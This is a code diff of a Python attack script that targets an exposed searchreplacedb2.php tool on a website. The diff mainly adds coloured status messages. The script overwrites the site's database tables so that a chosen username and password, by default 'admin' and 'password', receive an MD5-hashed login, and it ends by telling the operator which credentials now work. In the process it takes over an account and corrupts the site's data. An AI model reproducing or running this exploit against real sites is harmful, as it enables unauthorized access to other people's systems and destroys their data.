@@ -15,7 +15,8 @@ class Target(object):
 	def __init__(self, url, user,password):
 		self.url = self.sanitizeUrl(url)
 		self.user = user
-		self.PASSWORD_HASH = hashlib.md5(password).hexdigest()
+		self.password = password
+		self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
 
 
 	def replace(self,search,replace):
@@ -41,15 +42,21 @@ class Target(object):
 		self.place_user()
 
 	def attack_password(self):
+		good("Spraying wp-tables")
 		for x in range(0,len(ALPHABET)):
+			if x == len(ALPHABET)/2:
+				good("50% done")
 			self.replace(ALPHABET[x],'1')
+		good("Placing '"+self.password+"' as password")
 		for x in reversed(range(15,35)):
 			self.replace('1'*x,self.PASSWORD_HASH)
 
 	def keep_user(self):
+		good("Saving user '"+self.user+"'")
 		self.replace(self.user,"$$$")
 
 	def place_user(self):
+		good("Reverting username to '"+self.user+"'")
 		self.replace("$$$",self.user)
 
 	def populate(self):
@@ -59,7 +66,7 @@ class Target(object):
 		try:
 			response = urllib2.urlopen(self.url+"?step=2",data)
 		except:
-			print "Request error while trying to populate"
+			bad("Request error while trying to populate")
 			exit(1)
 		html = response.read()
 		html = html.split('\n')
@@ -84,6 +91,15 @@ class Target(object):
 			url += "searchreplacedb2.php"
 		return url
 
+def good(text):
+	print "[\x1B[32m+\x1B[0m] "+text
+
+def bad(text):
+	print "[\x1B[31m-\x1B[0m] "+text
+
+def info(text):
+	print "[\x1B[33m!\x1B[0m] "+text
+
 def main():
 	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> -u <user>")
 	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
@@ -96,21 +112,25 @@ def main():
 		exit(1)
 	else:
 		url = options.target_url
+
+	good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
 	
 	if options.target_user:
 		user = options.target_user
 	else:
-		print "Using 'admin' because no user was provided"
+		info("Using 'admin' because no user was provided")
 		user = "admin"
 
 	if options.target_password:
 		password = options.target_password
 	else:
+		info("Using 'password' because no password was provided")
 		password = "password"
 
 	t = Target(url,user,password)
 	t.populate()
 	t.attack_sequence()
+	good("You should be able to login using \x1B[32m"+t.user+":"+t.password+"\x1B[0m")
 
 if __name__ == "__main__":
 	main()
